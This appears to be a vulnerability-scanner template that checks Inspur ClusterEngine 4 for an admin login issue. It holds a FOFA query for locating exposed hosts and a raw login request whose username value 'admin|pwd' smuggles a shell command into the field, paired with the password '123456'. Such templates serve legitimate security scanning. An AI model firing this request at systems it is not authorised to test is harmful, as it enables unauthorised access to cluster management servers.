id: inspur-clusterengine-default-login
info:
  author: ritikchaddha
  description: Inspur Clusterengine version 4 default admin login credentials were
    successful.
  metadata:
    fofa-query: title="TSCEV4.0"
  name: Inspur Clusterengine 4 - Default Admin Login
  reference:
  - https://blog.csdn.net/qq_36197704/article/details/115665793
  severity: high
  tags: default-login,inspur,clusterengine
requests:
- attack: pitchfork
  matchers:
  - part: body
    type: word
    words:
    - '"exitcode":0'
  - condition: and
    part: header
    type: word
    words:
    - username=admin|pwd
  - status:
    - 200
    type: status
  matchers-condition: and
  max-redirects: 2
  payloads:
    password:
    - 123456
    username:
    - admin|pwd
  raw:
  - 'POST /login HTTP/1.1

    Host: {{Hostname}}


    op=login&username={{username}}&password={{password}}

    '
  redirects: true
